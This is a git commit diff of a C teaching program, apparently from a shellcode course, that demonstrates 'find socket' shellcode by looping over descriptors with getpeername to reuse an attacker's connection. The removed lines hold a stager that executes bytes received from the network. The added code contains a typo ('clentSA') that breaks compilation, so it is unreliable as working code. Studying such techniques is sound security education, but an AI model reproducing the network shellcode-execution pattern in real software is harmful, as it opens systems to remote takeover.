2a63bacfc3a5e8c41f6e2b9d3d23f0c50aab70e1
SLAE-941 <slae_burner@protonmail.com>
2017-06-20 16:04:20 +0200

    Update find_socket.c

--- assignment5/find_socket.c
+++ assignment5/find_socket.c
@@ -1,43 +1,52 @@
+/* Demonstration of the theory behind a find socket shellcode, use nc -nv <ip> 4444 -p 10000 to connect */
+
 #include <stdio.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #include <string.h>
 
-unsigned char buffer[1024];
-
 int main(void) {
-        int sockfd, newsockfd;
-        struct sockaddr_in serverSA, clientSA;
+        int sockfd, newsockfd; /* two sockets, one for the server and a second for the newly connected client */
+        struct sockaddr_in serverSA, clientSA, tempSA; 
         int clientSaSize = sizeof(struct sockaddr_in);
-        struct sockaddr_in tempSA;
         int i,j = sizeof (struct sockaddr_in);
         char *arg_list[] = { { "/bin/sh" }, NULL };
 
-        sockfd = socket(PF_INET, SOCK_STREAM, 0);
+        sockfd = socket(PF_INET, SOCK_STREAM, 0); /* create our socket for the server */
 
-        memset(serverSA.sin_zero, '\0', sizeof(serverSA.                     sin_zero));
-        serverSA.sin_family = AF_INET;
+        /* Populate our sockaddr_in structure with our server details */
+        memset(serverSA.sin_zero, '\0', sizeof(serverSA.sin_zero)); 
+        serverSA.sin_family = AF_INET; 
         serverSA.sin_addr.s_addr = htonl(INADDR_ANY);
         serverSA.sin_port = htons(4444);
 
-        bind(sockfd, (struct sockaddr *)&serverSA, sizeo                     f(serverSA));
+        /* Start our server listening on the port */
+        bind(sockfd, (struct sockaddr *)&serverSA, sizeof(serverSA));
         listen(sockfd, 2);
-        newsockfd = accept(sockfd, (struct sockaddr *)&c                     lientSA, &clientSaSize);
+        newsockfd = accept(sockfd, (struct sockaddr *)&clentSA, &clientSaSize);
 
+        /* For reference so we can see the getpeername loop in action */ 
         printf("newsockfd: %d\n", newsockfd);
 
+        /* This is where we demonstrate the process behind the socket find shellcode
+           Rather than using the socket allocated by accept() to newsockfd we loop through
+           socket descriptors using getpeername to identify our client */
+        
         for(i=256;i>=0;i--){
-        if(getpeername(i,(struct sockaddr *)&tempSA,&j)=                     =-1) {
-                continue;
+                if(getpeername(i,(struct sockaddr *)&tempSA,&j)==-1) {
+                /* if a socket descriptor is not valid, getpeername returns -1, move on to the next */
+                        continue;
+                }
+                /* If we made it here, the socketfd is valid, print it out and the port that it is using */
+                printf("Socket: %d, Port: %d\n", i, ntohs(tempSA.sin_port));
+                /* Check the port number in use by the socket descriptor, if it matches 10000 thats us! */
+                if(tempSA.sin_port==htons(10000)) break;
         }
-        printf("Socket: %d, Port: %d\n", i, ntohs(tempSA                     .sin_port));
-        if(tempSA.sin_port==htons(10000)) break;
-        }
-
-        i = recv(newsockfd, buffer, 1024, 0);
-        printf("Recieved %d bytes\n", i);
-        int (*ret)() = (int(*)())buffer;
-        ret();
+        /* We will assume if we made it all the way to 0 we didn't find ourselves :( */
+        if(i == 0) return 1;
+        /* normally we would reference newsockfd here, instead we are using the value found in our loop */
+        send(i, "Hello!", 6, 0);
+        close(sockfd);
         close(newsockfd);
         return 0;
 }
